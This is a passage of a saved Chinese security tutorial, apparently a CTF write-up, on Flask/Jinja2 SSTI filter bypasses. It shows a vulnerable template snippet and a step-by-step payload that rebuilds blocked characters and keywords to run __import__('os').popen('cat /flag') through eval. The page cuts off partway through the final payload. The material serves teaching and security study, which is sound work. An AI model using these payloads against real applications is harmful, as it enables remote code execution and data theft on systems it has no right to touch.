    <span class="n">template</span> <span class="o">=</span> <span class="s1">'''</span>

<span class="s1">    &lt;div class="center-content"&gt;</span>
<span class="s1">        &lt;p&gt;Hello, </span><span class="si">%s</span><span class="s1">&lt;/p&gt;</span>
<span class="s1">    &lt;/div&gt;</span>
<span class="s1">    &lt;!--flag in /flag--&gt;</span>
<span class="s1">    &lt;!--python3.8--&gt;</span>
<span class="s1">'''</span> <span class="o">%</span> <span class="p">(</span><span class="n">name</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">template</span><span class="p">)</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">"__main__"</span><span class="p">:</span>
    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">'0.0.0.0'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">5000</span><span class="p">)</span>
</pre></div>
<p>可以看到题目过滤的死死地，最关键是把attr也给过滤了的话，这就很麻烦了，但是我们还可以用过滤器进行绕过。</p>
<p>在存在ssti的地方执行如下payload：</p>
<div class="highlight"><pre><span></span><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">org</span> <span class="o">=</span> <span class="p">({</span> <span class="p">}</span><span class="o">|</span><span class="n">select</span><span class="p">()</span><span class="o">|</span><span class="n">string</span><span class="p">())</span> <span class="o">%</span><span class="p">}{{</span><span class="n">org</span><span class="p">}}</span>
<span class="c1"># 或 {% set org = ({ }|select|string) %}{{org}}</span>
</pre></div>
<p><a id="img11" href="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174701-275b3a1e-bd3e-1.png"><img src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174701-275b3a1e-bd3e-1.png"></a></p>
<p>可以看到，我们得到了一段字符串：<code>&lt;generator object select_or_reject at 0x7f06771f4150&gt;</code>，这段字符串中不仅存在字符，还存在空格、下划线，尖号和数字。也就是说，如果题目过滤了这些字符的话，我们便可以在 <code>&lt;generator object select_or_reject at 0x7f06771f4150&gt;</code> 这个字符串中取到我们想要的字符，从而绕过过滤。</p>
<p>然后我们在使用list()过滤器将字符串转化为列表：</p>
<div class="highlight"><pre><span></span><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">orglst</span> <span class="o">=</span> <span class="p">({</span> <span class="p">}</span><span class="o">|</span><span class="n">select</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="nb">list</span><span class="p">)</span> <span class="o">%</span><span class="p">}{{</span><span class="n">orglst</span><span class="p">}}</span>
</pre></div>
<p><a id="img12" href="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174701-2780bf78-bd3e-1.png"><img src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174701-2780bf78-bd3e-1.png"></a></p>
<p>如上图所示，反回了一个列表，列表中是 <code>&lt;generator object select_or_reject at 0x7f06771f4150&gt;</code> 这个字符串的每一个字符。接下来我们便可以使用使用pop()等方法将列表里的字符取出来了。如下所示，我们取一个下划线 <code>_</code>：</p>
<div class="highlight"><pre><span></span><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">xhx</span> <span class="o">=</span> <span class="p">(({</span> <span class="p">}</span><span class="o">|</span><span class="n">select</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="nb">list</span><span class="p">)</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">24</span><span class="p">)</span><span class="o">|</span><span class="n">string</span><span class="p">)</span> <span class="o">%</span><span class="p">}{{</span><span class="n">xhx</span><span class="p">}}</span>    <span class="c1"># _</span>
</pre></div>
<p><a id="img13" href="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174701-27a4f47e-bd3e-1.png"><img src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174701-27a4f47e-bd3e-1.png"></a></p>
<p>同理还能取到更多的字符：</p>
<div class="highlight"><pre><span></span><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">space</span> <span class="o">=</span> <span class="p">(({</span> <span class="p">}</span><span class="o">|</span><span class="n">select</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="nb">list</span><span class="p">)</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span><span class="o">|</span><span class="n">string</span><span class="p">)</span> <span class="o">%</span><span class="p">}{{</span><span class="n">spa</span><span class="p">}}</span>    <span class="c1"># 空格</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">xhx</span> <span class="o">=</span> <span class="p">(({</span> <span class="p">}</span><span class="o">|</span><span class="n">select</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="nb">list</span><span class="p">)</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">24</span><span class="p">)</span><span class="o">|</span><span class="n">string</span><span class="p">)</span> <span class="o">%</span><span class="p">}{{</span><span class="n">xhx</span><span class="p">}}</span>    <span class="c1"># _</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">zero</span> <span class="o">=</span> <span class="p">(({</span> <span class="p">}</span><span class="o">|</span><span class="n">select</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="nb">list</span><span class="p">)</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">38</span><span class="p">)</span><span class="o">|</span><span class="nb">int</span><span class="p">)</span> <span class="o">%</span><span class="p">}{{</span><span class="n">zero</span><span class="p">}}</span>    <span class="c1"># 0</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">seven</span> <span class="o">=</span> <span class="p">(({</span> <span class="p">}</span><span class="o">|</span><span class="n">select</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="nb">list</span><span class="p">)</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">40</span><span class="p">)</span><span class="o">|</span><span class="nb">int</span><span class="p">)</span> <span class="o">%</span><span class="p">}{{</span><span class="n">seven</span><span class="p">}}</span>    <span class="c1"># 7</span>
<span class="o">......</span>
</pre></div>
<p>这里，其实有了数字0之后，我们便可以依次将其余的数字全部构造出来，原理就是加减乘除、平方等数学运算，如下示例：</p>
<div class="highlight"><pre><span></span><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">zero</span> <span class="o">=</span> <span class="p">(({</span> <span class="p">}</span><span class="o">|</span><span class="n">select</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="nb">list</span><span class="p">)</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">38</span><span class="p">)</span><span class="o">|</span><span class="nb">int</span><span class="p">)</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># 0</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">one</span> <span class="o">=</span> <span class="p">(</span><span class="n">zero</span><span class="o">**</span><span class="n">zero</span><span class="p">)</span><span class="o">|</span><span class="nb">int</span> <span class="o">%</span><span class="p">}{{</span><span class="n">one</span><span class="p">}}</span>    <span class="c1"># 1</span>
<span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">two</span> <span class="o">=</span> <span class="p">(</span><span class="n">zero</span><span class="o">-</span><span class="n">one</span><span class="o">-</span><span class="n">one</span><span class="p">)</span><span class="o">|</span><span class="nb">abs</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># 2</span>
<span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">three</span> <span class="o">=</span> <span class="p">(</span><span class="n">zero</span><span class="o">-</span><span class="n">one</span><span class="o">-</span><span class="n">one</span><span class="o">-</span><span class="n">one</span><span class="p">)</span><span class="o">|</span><span class="nb">abs</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># 3</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">five</span> <span class="o">=</span> <span class="p">(</span><span class="n">two</span><span class="o">*</span><span class="n">two</span><span class="o">*</span><span class="n">two</span><span class="p">)</span><span class="o">-</span><span class="n">one</span><span class="o">-</span><span class="n">one</span><span class="o">-</span><span class="n">one</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># 5</span>
<span class="c1">#  {%set four = (one+three) %}    注意, 这样的加号的是不行的,不知道为什么,只能用减号配合abs取绝对值了</span>
<span class="o">......</span>
</pre></div>
<p><a id="img14" href="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174701-27cdd556-bd3e-1.png"><img src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174701-27cdd556-bd3e-1.png"></a></p>
<p>通过上述原理，我们可以依次获得构造payload所需的特殊字符与字符串：</p>
<div class="highlight"><pre><span></span><span class="c1"># 首先构造出所需的数字:</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">zero</span> <span class="o">=</span> <span class="p">(({</span> <span class="p">}</span><span class="o">|</span><span class="n">select</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="nb">list</span><span class="p">)</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">38</span><span class="p">)</span><span class="o">|</span><span class="nb">int</span><span class="p">)</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># 0</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">one</span> <span class="o">=</span> <span class="p">(</span><span class="n">zero</span><span class="o">**</span><span class="n">zero</span><span class="p">)</span><span class="o">|</span><span class="nb">int</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># 1</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">two</span> <span class="o">=</span> <span class="p">(</span><span class="n">zero</span><span class="o">-</span><span class="n">one</span><span class="o">-</span><span class="n">one</span><span class="p">)</span><span class="o">|</span><span class="nb">abs</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># 2</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">four</span> <span class="o">=</span> <span class="p">(</span><span class="n">two</span><span class="o">*</span><span class="n">two</span><span class="p">)</span><span class="o">|</span><span class="nb">int</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># 4</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">five</span> <span class="o">=</span> <span class="p">(</span><span class="n">two</span><span class="o">*</span><span class="n">two</span><span class="o">*</span><span class="n">two</span><span class="p">)</span><span class="o">-</span><span class="n">one</span><span class="o">-</span><span class="n">one</span><span class="o">-</span><span class="n">one</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># 5</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">seven</span> <span class="o">=</span> <span class="p">(</span><span class="n">zero</span><span class="o">-</span><span class="n">one</span><span class="o">-</span><span class="n">one</span><span class="o">-</span><span class="n">five</span><span class="p">)</span><span class="o">|</span><span class="nb">abs</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># 7</span>

<span class="c1"># 构造出所需的各种字符与字符串:</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">xhx</span> <span class="o">=</span> <span class="p">(({</span> <span class="p">}</span><span class="o">|</span><span class="n">select</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="nb">list</span><span class="p">)</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">24</span><span class="p">)</span><span class="o">|</span><span class="n">string</span><span class="p">)</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># _</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">space</span> <span class="o">=</span> <span class="p">(({</span> <span class="p">}</span><span class="o">|</span><span class="n">select</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="nb">list</span><span class="p">)</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span><span class="o">|</span><span class="n">string</span><span class="p">)</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># 空格</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">point</span> <span class="o">=</span> <span class="p">((</span><span class="n">app</span><span class="o">.</span><span class="vm">__doc__</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="nb">list</span><span class="p">)</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">26</span><span class="p">)</span><span class="o">|</span><span class="n">string</span><span class="p">)</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># .</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">yin</span> <span class="o">=</span> <span class="p">((</span><span class="n">app</span><span class="o">.</span><span class="vm">__doc__</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="nb">list</span><span class="p">)</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">195</span><span class="p">)</span><span class="o">|</span><span class="n">string</span><span class="p">)</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># 单引号 '</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">left</span> <span class="o">=</span> <span class="p">((</span><span class="n">app</span><span class="o">.</span><span class="vm">__doc__</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="nb">list</span><span class="p">)</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">189</span><span class="p">)</span><span class="o">|</span><span class="n">string</span><span class="p">)</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># 左括号 (</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">right</span> <span class="o">=</span> <span class="p">((</span><span class="n">app</span><span class="o">.</span><span class="vm">__doc__</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="nb">list</span><span class="p">)</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span><span class="o">|</span><span class="n">string</span><span class="p">)</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># 右括号 )</span>

<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">c</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">c</span><span class="o">=</span><span class="n">aa</span><span class="p">)</span><span class="o">|</span><span class="n">reverse</span><span class="o">|</span><span class="n">first</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># 字符 c</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">bfh</span> <span class="o">=</span> <span class="bp">self</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="n">urlencode</span><span class="o">|</span><span class="n">first</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># 百分号 %</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">bfhc</span><span class="o">=</span><span class="n">bfh</span><span class="o">~</span><span class="n">c</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># 这里构造了%c, 之后可以利用这个%c构造任意字符。~用于字符连接</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">slas</span> <span class="o">=</span> <span class="n">bfhc</span><span class="o">%</span><span class="p">((</span><span class="n">four</span><span class="o">~</span><span class="n">seven</span><span class="p">)</span><span class="o">|</span><span class="nb">int</span><span class="p">)</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># 使用%c构造斜杠 /</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">but</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">buil</span><span class="o">=</span><span class="n">aa</span><span class="p">,</span><span class="n">tins</span><span class="o">=</span><span class="n">dd</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># builtins</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">imp</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">imp</span><span class="o">=</span><span class="n">aa</span><span class="p">,</span><span class="n">ort</span><span class="o">=</span><span class="n">dd</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># import</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">pon</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">po</span><span class="o">=</span><span class="n">aa</span><span class="p">,</span><span class="n">pen</span><span class="o">=</span><span class="n">dd</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># popen</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">os</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">o</span><span class="o">=</span><span class="n">aa</span><span class="p">,</span><span class="n">s</span><span class="o">=</span><span class="n">dd</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># os</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">ca</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">ca</span><span class="o">=</span><span class="n">aa</span><span class="p">,</span><span class="n">t</span><span class="o">=</span><span class="n">dd</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># cat</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">flg</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">fl</span><span class="o">=</span><span class="n">aa</span><span class="p">,</span><span class="n">ag</span><span class="o">=</span><span class="n">dd</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># flag</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">ev</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">ev</span><span class="o">=</span><span class="n">aa</span><span class="p">,</span><span class="n">al</span><span class="o">=</span><span class="n">dd</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># eval</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">red</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">re</span><span class="o">=</span><span class="n">aa</span><span class="p">,</span><span class="n">ad</span><span class="o">=</span><span class="n">dd</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># read</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">bul</span> <span class="o">=</span> <span class="n">xhx</span><span class="o">*</span><span class="mi">2</span><span class="o">~</span><span class="n">but</span><span class="o">~</span><span class="n">xhx</span><span class="o">*</span><span class="mi">2</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># __builtins__</span>
</pre></div>
<p>将上面构造的字符或字符串拼接起来构造出 <code>__import__('os').popen('cat /flag').read()</code>：</p>
<div class="highlight"><pre><span></span><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">pld</span> <span class="o">=</span> <span class="n">xhx</span><span class="o">*</span><span class="mi">2</span><span class="o">~</span><span class="n">imp</span><span class="o">~</span><span class="n">xhx</span><span class="o">*</span><span class="mi">2</span><span class="o">~</span><span class="n">left</span><span class="o">~</span><span class="n">yin</span><span class="o">~</span><span class="n">os</span><span class="o">~</span><span class="n">yin</span><span class="o">~</span><span class="n">right</span><span class="o">~</span><span class="n">point</span><span class="o">~</span><span class="n">pon</span><span class="o">~</span><span class="n">left</span><span class="o">~</span><span class="n">yin</span><span class="o">~</span><span class="n">ca</span><span class="o">~</span><span class="n">space</span><span class="o">~</span><span class="n">slas</span><span class="o">~</span><span class="n">flg</span><span class="o">~</span><span class="n">yin</span><span class="o">~</span><span class="n">right</span><span class="o">~</span><span class="n">point</span><span class="o">~</span><span class="n">red</span><span class="o">~</span><span class="n">left</span><span class="o">~</span><span class="n">right</span> <span class="o">%</span><span class="p">}</span>
</pre></div>
<p><a id="img15" href="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174702-282904b2-bd3e-1.png"><img src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174702-282904b2-bd3e-1.png"></a></p>
<p>如上图所示，成功构造出了  <code>__import__('os').popen('cat /flag').read()</code> 。</p>
<p>然后将上面构造的各种变量添加到SSTI万能payload里面就行了：</p>
<div class="highlight"><pre><span></span><span class="p">{</span><span class="o">%</span> <span class="k">for</span> <span class="n">f</span><span class="p">,</span><span class="n">v</span> <span class="ow">in</span> <span class="n">whoami</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">items</span><span class="p">()</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># globals</span>
    <span class="p">{</span><span class="o">%</span> <span class="k">if</span> <span class="n">f</span> <span class="o">==</span> <span class="n">bul</span> <span class="o">%</span><span class="p">}</span> 
        <span class="p">{</span><span class="o">%</span> <span class="k">for</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span> <span class="ow">in</span> <span class="n">v</span><span class="o">.</span><span class="n">items</span><span class="p">()</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># builtins</span>
            <span class="p">{</span><span class="o">%</span> <span class="k">if</span> <span class="n">a</span> <span class="o">==</span> <span class="n">ev</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># eval</span>
                <span class="p">{{</span><span class="n">b</span><span class="p">(</span><span class="n">pld</span><span class="p">)}}</span>    <span class="c1"># eval("__import__('os').popen('cat /flag').read()")</span>
            <span class="p">{</span><span class="o">%</span> <span class="n">endif</span> <span class="o">%</span><span class="p">}</span>
        <span class="p">{</span><span class="o">%</span> <span class="n">endfor</span> <span class="o">%</span><span class="p">}</span>
    <span class="p">{</span><span class="o">%</span> <span class="n">endif</span> <span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span> <span class="n">endfor</span> <span class="o">%</span><span class="p">}</span>
</pre></div>
<p>所以最终的payload为：</p>
<div class="highlight"><pre><span></span><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">zero</span> <span class="o">=</span> <span class="p">(({</span> <span class="p">}</span><span class="o">|</span><span class="n">select</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="nb">list</span><span class="p">)</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">38</span><span class="p">)</span><span class="o">|</span><span class="nb">int</span><span class="p">)</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">one</span> <span class="o">=</span> <span class="p">(</span><span class="n">zero</span><span class="o">**</span><span class="n">zero</span><span class="p">)</span><span class="o">|</span><span class="nb">int</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">two</span> <span class="o">=</span> <span class="p">(</span><span class="n">zero</span><span class="o">-</span><span class="n">one</span><span class="o">-</span><span class="n">one</span><span class="p">)</span><span class="o">|</span><span class="nb">abs</span><span class="o">|</span><span class="nb">int</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">four</span> <span class="o">=</span> <span class="p">(</span><span class="n">two</span><span class="o">*</span><span class="n">two</span><span class="p">)</span><span class="o">|</span><span class="nb">int</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">five</span> <span class="o">=</span> <span class="p">(</span><span class="n">two</span><span class="o">*</span><span class="n">two</span><span class="o">*</span><span class="n">two</span><span class="p">)</span><span class="o">-</span><span class="n">one</span><span class="o">-</span><span class="n">one</span><span class="o">-</span><span class="n">one</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">seven</span> <span class="o">=</span> <span class="p">(</span><span class="n">zero</span><span class="o">-</span><span class="n">one</span><span class="o">-</span><span class="n">one</span><span class="o">-</span><span class="n">five</span><span class="p">)</span><span class="o">|</span><span class="nb">abs</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">xhx</span> <span class="o">=</span> <span class="p">(({</span> <span class="p">}</span><span class="o">|</span><span class="n">select</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="nb">list</span><span class="p">)</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">24</span><span class="p">)</span><span class="o">|</span><span class="n">string</span><span class="p">)</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">space</span> <span class="o">=</span> <span class="p">(({</span> <span class="p">}</span><span class="o">|</span><span class="n">select</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="nb">list</span><span class="p">)</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span><span class="o">|</span><span class="n">string</span><span class="p">)</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">point</span> <span class="o">=</span> <span class="p">((</span><span class="n">app</span><span class="o">.</span><span class="vm">__doc__</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="nb">list</span><span class="p">)</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">26</span><span class="p">)</span><span class="o">|</span><span class="n">string</span><span class="p">)</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">yin</span> <span class="o">=</span> <span class="p">((</span><span class="n">app</span><span class="o">.</span><span class="vm">__doc__</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="nb">list</span><span class="p">)</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">195</span><span class="p">)</span><span class="o">|</span><span class="n">string</span><span class="p">)</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">left</span> <span class="o">=</span> <span class="p">((</span><span class="n">app</span><span class="o">.</span><span class="vm">__doc__</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="nb">list</span><span class="p">)</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">189</span><span class="p">)</span><span class="o">|</span><span class="n">string</span><span class="p">)</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">right</span> <span class="o">=</span> <span class="p">((</span><span class="n">app</span><span class="o">.</span><span class="vm">__doc__</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="nb">list</span><span class="p">)</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span><span class="o">|</span><span class="n">string</span><span class="p">)</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">c</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">c</span><span class="o">=</span><span class="n">aa</span><span class="p">)</span><span class="o">|</span><span class="n">reverse</span><span class="o">|</span><span class="n">first</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">bfh</span><span class="o">=</span><span class="bp">self</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="n">urlencode</span><span class="o">|</span><span class="n">first</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">bfhc</span><span class="o">=</span><span class="n">bfh</span><span class="o">~</span><span class="n">c</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">slas</span> <span class="o">=</span> <span class="n">bfhc</span><span class="o">%</span><span class="p">((</span><span class="n">four</span><span class="o">~</span><span class="n">seven</span><span class="p">)</span><span class="o">|</span><span class="nb">int</span><span class="p">)</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">but</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">buil</span><span class="o">=</span><span class="n">aa</span><span class="p">,</span><span class="n">tins</span><span class="o">=</span><span class="n">dd</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">imp</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">imp</span><span class="o">=</span><span class="n">aa</span><span class="p">,</span><span class="n">ort</span><span class="o">=</span><span class="n">dd</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">pon</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">po</span><span class="o">=</span><span class="n">aa</span><span class="p">,</span><span class="n">pen</span><span class="o">=</span><span class="n">dd</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">os</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">o</span><span class="o">=</span><span class="n">aa</span><span class="p">,</span><span class="n">s</span><span class="o">=</span><span class="n">dd</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">ca</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">ca</span><span class="o">=</span><span class="n">aa</span><span class="p">,</span><span class="n">t</span><span class="o">=</span><span class="n">dd</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span 